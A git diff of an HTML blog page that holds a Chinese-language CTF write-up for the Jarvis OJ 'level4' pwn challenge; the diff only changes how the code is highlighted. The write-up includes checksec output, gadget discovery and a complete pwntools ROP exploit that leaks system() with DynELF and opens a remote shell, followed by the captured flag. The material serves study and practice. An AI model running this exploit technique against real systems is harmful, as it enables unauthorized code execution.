@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -488,18 +489,72 @@
     
         <h2 id="做这个题目"><a href="#做这个题目" class="headerlink" title="做这个题目"></a>做这个题目</h2><p>题目地址: <a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="external">https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
 <p>描述: nc pwn2.jarvisoj.com 9880</p>
-<h2 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h2><p><code>ida</code>看一下有一个<code>read(0, &amp;buf, 0x100u);</code><br><code>checksec</code>一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    No canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure></p>
-<p>就开启了<code>NX</code><br>这题好像是顺着蒸米的一步步x64那个leak来的<br>因为没有libc，所以要leak出system，并且在bss段上构造<code>/bin/sh</code></p>
-<p>先gdb一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern offset 0x41416d41</div><div class="line">1094806849 found at offset: 140</div></pre></td></tr></table></figure></p>
-<p><code>readelf -S</code>找到<code>bss</code>段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[25] .bss              NOBITS          0804a024</div></pre></td></tr></table></figure></p>
-<p>mark下 <code>bss_addr = 0x0804a024</code></p>
-<p>在执行完<code>read</code>之后我们要执行<code>system(&#39;/bin/sh&#39;)</code>，read的参数是三个<br>所以为了平衡堆栈，我们找到<code>pop pop pop ret</code>这样的gadget<br><code>objdump -D pwnfile | cat -n | grep pop</code><br>=&gt; <code>cat -n</code>是对输出输出的行从1开始编号,可以看得出是不是相邻的指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">425	 8048508:	5b                   	pop    %ebx</div><div class="line">426	 8048509:	5e                   	pop    %esi</div><div class="line">427	 804850a:	5f                   	pop    %edi</div><div class="line">428	 804850b:	5d                   	pop    %ebp</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>好了一下找到了4个就可以构造rop了,(一般就是某个函数在返回前要恢复现场时候的pop数次+ret)</p>
+<h2 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h2><p><code>ida</code>看一下有一个<code>read(0, &amp;buf, 0x100u);</code><br><code>checksec</code>一下</p>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+</code></pre><p>就开启了<code>NX</code><br>这题好像是顺着蒸米的一步步x64那个leak来的<br>因为没有libc，所以要leak出system，并且在bss段上构造<code>/bin/sh</code></p>
+<p>先gdb一下</p>
+<pre class="line-numbers language-bash"><code class="language-bash">gdb-peda$ pattern offset 0x41416d41
+1094806849 found at offset: 140
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><code>readelf -S</code>找到<code>bss</code>段</p>
+<pre><code>[25] .bss              NOBITS          0804a024
+</code></pre><p>mark下 <code>bss_addr = 0x0804a024</code></p>
+<p>在执行完<code>read</code>之后我们要执行<code>system(&#39;/bin/sh&#39;)</code>，read的参数是三个<br>所以为了平衡堆栈，我们找到<code>pop pop pop ret</code>这样的gadget<br><code>objdump -D pwnfile | cat -n | grep pop</code><br>=&gt; <code>cat -n</code>是对输出输出的行从1开始编号,可以看得出是不是相邻的指令</p>
+<pre><code>...
+425     8048508:    5b                       pop    %ebx
+426     8048509:    5e                       pop    %esi
+427     804850a:    5f                       pop    %edi
+428     804850b:    5d                       pop    %ebp
+...
+</code></pre><p>好了一下找到了4个就可以构造rop了,(一般就是某个函数在返回前要恢复现场时候的pop数次+ret)</p>
 <p>payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># p = process('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')</span></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</div><div class="line"></div><div class="line">vuln_addr = <span class="number">0x0804844B</span></div><div class="line">pppr_addr = <span class="number">0x08048509</span> <span class="comment">#pop pop pop ret</span></div><div class="line">bss_addr  = <span class="number">0x0804a024</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span>)</div><div class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</div><div class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">    payload1 = <span class="string">'A'</span> * <span class="number">140</span> + p32(plt_write) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</div><div class="line">    p.send(payload1)</div><div class="line">    data = p.recv(<span class="number">4</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[-] %#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span>)) <span class="comment"># important</span></div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) <span class="comment"># leak addr of system~~</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[+] get the addr of system"</span></div><div class="line"></div><div class="line">payload2 = <span class="string">'a'</span> * <span class="number">140</span> + p32(plt_read) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) <span class="comment"># read(1, bss_addr, 8) ret to `pop pop pop ret`</span></div><div class="line">payload2 += p32(system_addr) + p32(vuln_addr) + p32(bss_addr) <span class="comment"># system('/bin/sh') ret to vulnfunction</span></div><div class="line"></div><div class="line">p.send(payload2)</div><div class="line">p.send(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>拿到flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">flag</div><div class="line">level4</div><div class="line">$ cat flag</div><div class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</div><div class="line">$ <span class="built_in">exit</span></div></pre></td></tr></table></figure></p>
-<h2 id="还有一个"><a href="#还有一个" class="headerlink" title="还有一个"></a>还有一个</h2><p>我本地始终无法复现，真是崩溃TAT<br>无论是直接process还是用socat,poc一跑就会出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exited on signal 11</div></pre></td></tr></table></figure></p>
-<p>之类的错误</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true"># p = process('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9880</span><span class="token punctuation">)</span>
+
+vuln_addr <span class="token operator">=</span> <span class="token number">0x0804844B</span>
+pppr_addr <span class="token operator">=</span> <span class="token number">0x08048509</span> <span class="token comment" spellcheck="true">#pop pop pop ret</span>
+bss_addr  <span class="token operator">=</span> <span class="token number">0x0804a024</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span><span class="token punctuation">)</span>
+plt_read <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload1 <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token string">"[-] %#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data
+
+d <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># important</span>
+
+system_addr <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># leak addr of system~~</span>
+<span class="token keyword">print</span> <span class="token string">"[+] get the addr of system"</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>plt_read<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pppr_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read(1, bss_addr, 8) ret to `pop pop pop ret`</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># system('/bin/sh') ret to vulnfunction</span>
+
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'/bin/sh\0'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>拿到flag</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">ls</span>
+flag
+level4
+$ <span class="token function">cat</span> flag
+CTF<span class="token punctuation">{</span>882130cf51d65fb705440b218e94e98e<span class="token punctuation">}</span>
+$ <span class="token keyword">exit</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="还有一个"><a href="#还有一个" class="headerlink" title="还有一个"></a>还有一个</h2><p>我本地始终无法复现，真是崩溃TAT<br>无论是直接process还是用socat,poc一跑就会出现</p>
+<pre><code>exited on signal 11
+</code></pre><p>之类的错误</p>
 <h2 id="看到了关于DynELF的相关"><a href="#看到了关于DynELF的相关" class="headerlink" title="看到了关于DynELF的相关"></a>看到了关于<code>DynELF</code>的相关</h2><p>muhe 的 <code>what DynELF does basically</code><a href="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/" target="_blank" rel="external">http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/</a><br>mark 一下 认真学习一下</p>
 
         
